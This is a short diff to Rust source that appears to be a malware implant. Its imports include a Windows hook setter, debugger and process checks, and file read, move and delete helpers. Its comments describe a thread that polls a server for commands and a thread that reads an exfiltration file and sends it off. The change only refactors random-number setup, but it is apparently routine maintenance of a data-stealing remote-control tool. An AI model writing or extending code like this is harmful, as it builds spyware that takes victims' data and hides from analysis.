@@ -5,8 +5,8 @@ use std::{sync::Arc, u32};
 use system::{get_windows_version, read_file, set_windows_hook, delete_file,check_for_debugging, check_for_process, mv_file};
 use tokio::time::{sleep, Duration, Sleep};
 use std::sync::atomic::{AtomicBool, Ordering};
-use rand::{rngs::StdRng, SeedableRng, Rng};
-use encode::EncodeConnection;
+use rand::{Rng, SeedableRng, rngs::StdRng, rngs::OsRng};
+
 
 macro_rules! unwrap_or_panic {
     ($expr: expr) => {
@@ -95,7 +95,7 @@ async fn main() {
     
     //thread that request for commands
     tokio::spawn(async move {
-        let mut rng = StdRng::from_os_rng();
+        let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
         loop {
             if paused_command.load(Ordering::Relaxed) {
                 sleep(Duration::from_secs(1)).await;
@@ -111,7 +111,7 @@ async fn main() {
 
     let paused_exfil = Arc::clone(&paused);
 
-    let mut rng = StdRng::from_os_rng();
+    let mut rng = StdRng::from_rng(OsRng).expect("Failed to create RNG");
 
     //thread that reads exfill file, and sends it off to the server
     tokio::spawn(async move {
